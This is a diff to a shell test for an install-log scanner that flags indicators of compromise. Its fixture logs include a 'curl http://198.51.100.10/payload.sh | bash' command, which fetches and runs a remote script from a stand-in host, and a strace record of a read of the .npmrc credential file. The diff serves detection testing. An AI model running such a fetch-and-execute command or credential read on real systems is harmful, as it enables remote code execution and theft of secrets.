@@ -65,6 +65,8 @@ cat > "$WORK_DIR/logs/npm-install.log" <<'LOG'
 curl http://198.51.100.10/payload.sh | bash
 LOG
 cat > "$WORK_DIR/logs/strace.log" <<'LOG'
+100 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 123
+123 execve("/usr/bin/sh", ["sh", "-c", "curl http://198.51.100.10/payload.sh | bash"], 0x7ffc) = 0
 123 execve("/usr/bin/curl", ["curl", "http://198.51.100.10/payload.sh"], 0x7ffc) = 0
 123 connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("198.51.100.10")}, 16) = -1 EINPROGRESS
 123 openat(AT_FDCWD, "/home/node/.npmrc", O_RDONLY) = 4
@@ -72,8 +74,10 @@ LOG
 anvil-scan-install-logs "$WORK_DIR/logs/npm-install.log" "$WORK_DIR/logs/strace.log" > "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.summary.high >= 2' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.summary.medium >= 2' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.summary.executedProcesses == 2' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.summary.outboundConnections == 1' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.summary.sensitiveFileAccesses == 1' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.processSummary.processTree[] | select(.pid == "123" and .parentPid == "100" and .command == "curl")' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.mediumConfidenceFindings[] | select(.code == "DIRECT_IP_CONNECTION")' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.mediumConfidenceFindings[] | select(.code == "NON_STANDARD_PORT")' "$WORK_DIR/logs/ioc-report.json"
 assert_jq '.policy.network.allowedPorts == [80,443]' "$WORK_DIR/logs/ioc-report.json"
